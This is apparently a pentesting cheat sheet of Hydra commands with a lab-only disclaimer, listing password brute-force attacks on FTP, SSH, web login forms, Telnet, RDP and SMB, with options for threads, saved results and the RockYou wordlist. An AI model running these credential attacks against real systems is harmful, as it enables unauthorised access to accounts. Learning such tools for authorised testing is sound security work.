# Hydra Commands

> ⚠️ Educational purposes only. Use only in authorized lab environments.

---

# Help Menu

## Display Hydra Help

```bash
hydra -h
```

Used to display all available Hydra commands and options.

---

# FTP Brute Force Attack

## Attack FTP Login

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.1.20 -V
```

Used to:
- Perform FTP brute-force attack
- Test username and password combinations
- Identify valid FTP credentials

---

# SSH Brute Force Attack

## Attack SSH Login

```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.20
```

Used to:
- Perform SSH password attack
- Discover weak SSH credentials

---

# HTTP POST Form Attack

## Web Login Brute Force

```bash
hydra -l admin -P passwords.txt 192.168.1.20 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

Used to:
- Attack web login forms
- Test HTTP authentication systems

---

# Telnet Brute Force

## Attack Telnet Service

```bash
hydra -L users.txt -P passwords.txt telnet://192.168.1.20
```

Used to brute-force Telnet login credentials.

---

# RDP Brute Force

## Attack Remote Desktop

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.20
```

Used to test weak RDP passwords.

---

# SMB Brute Force

## Attack SMB Service

```bash
hydra -L users.txt -P passwords.txt smb://192.168.1.20
```

Used to identify SMB authentication weaknesses.

---

# Use Verbose Mode

## Enable Detailed Output

```bash
hydra -V
```

Used to display detailed attack progress.

---

# Stop After First Success

## Fast Credential Discovery

```bash
hydra -f
```

Used to stop attack after finding valid credentials.

---

# Multi-threaded Attack

## Increase Attack Speed

```bash
hydra -t 10
```

Used to run multiple parallel threads.

---

# Use Specific Username

## Single User Attack

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.20
```

Used to attack a single username account.

---

# Use Username List

## Multiple Usernames

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.20
```

Used to attack multiple usernames using a password list.

---

# Save Output

## Store Results

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.20 -o result.txt
```

Used to save successful credentials into a file.

---

# Restore Previous Session

## Resume Interrupted Attack

```bash
hydra -R
```

Used to continue previous Hydra session.

---

# Common Wordlist

## Extract RockYou Wordlist

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

Used to extract the popular RockYou password wordlist.
